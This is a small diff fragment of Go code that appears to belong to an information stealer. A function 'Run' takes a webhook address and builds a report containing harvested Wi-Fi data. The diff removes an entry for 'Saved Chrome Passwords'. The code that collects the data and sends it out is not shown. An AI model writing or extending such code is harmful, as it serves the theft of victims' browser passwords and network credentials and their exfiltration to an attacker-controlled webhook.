@@ -226,9 +226,6 @@ func Run(webhook string) {
 						"value": fmt.Sprintf("```%s```", GetWifi()),
 					},
 				},
-			}, {
-				"title":       "Saved Chrome Passwords",
-				"description": "Check the File below",
 			},
 		},
 	})
